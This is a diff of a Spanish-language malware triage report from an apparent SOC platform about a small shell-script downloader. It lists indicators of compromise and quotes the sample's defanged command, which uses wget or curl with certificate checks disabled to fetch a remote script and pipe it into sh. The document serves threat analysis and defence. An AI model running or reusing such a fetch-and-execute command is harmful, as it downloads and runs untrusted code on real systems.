@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asociaron 2 comandos observados o extraídos.
+Artefacto identificado como ASCII text, with CRLF line terminators de 789 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `sh` en `hxxps://14.46.136.XXX/sh`. Se observaron o extrajeron 2 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T20:46:01+00:00`
+- **Registrado:** `2026-08-09T20:46:01.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -45,21 +46,21 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 ## 🖥️ Comandos observados / extraídos
 
 ```text
-(wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh || curl -sk hxxps://14.46.136.XXX/sh) | sh -s apache.selfrep
 (wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh || curl -sk hxxps://14.46.136.XXX/sh) | sh -s apache.selfrepPOS
+(wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh || curl -sk hxxps://14.46.136.XXX/sh) | sh -s apache.selfrep
 ```
 
 ## 🌐 Indicadores
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 14.46.136.XXX | static_analysis |
-| ip | 190.179.163.XXX | static_analysis |
 | url | hxxps://14.46.136.XXX/sh | strings |
 | url | hxxps://14.46.136.XXX/sh) | strings |
-| hash | f74149c39806f676649074bae8ecf9c2d701fd6e7bce6f7cfa88bd51390bdb55 | static_analysis |
-| command | (wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh \|\| curl -sk hxxps://14.46.136.XXX/sh) \| sh -s apache.selfrep | strings |
+| ip | 14.46.136.XXX | static_analysis |
+| ip | 190.179.163.XXX | static_analysis |
 | command | (wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh \|\| curl -sk hxxps://14.46.136.XXX/sh) \| sh -s apache.selfrepPOS | strings |
+| command | (wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh \|\| curl -sk hxxps://14.46.136.XXX/sh) \| sh -s apache.selfrep | strings |
+| hash | f74149c39806f676649074bae8ecf9c2d701fd6e7bce6f7cfa88bd51390bdb55 | static_analysis |
 | ip | 185.38.148.XXX | artifact_source |
 
 ## 🔎 Triage
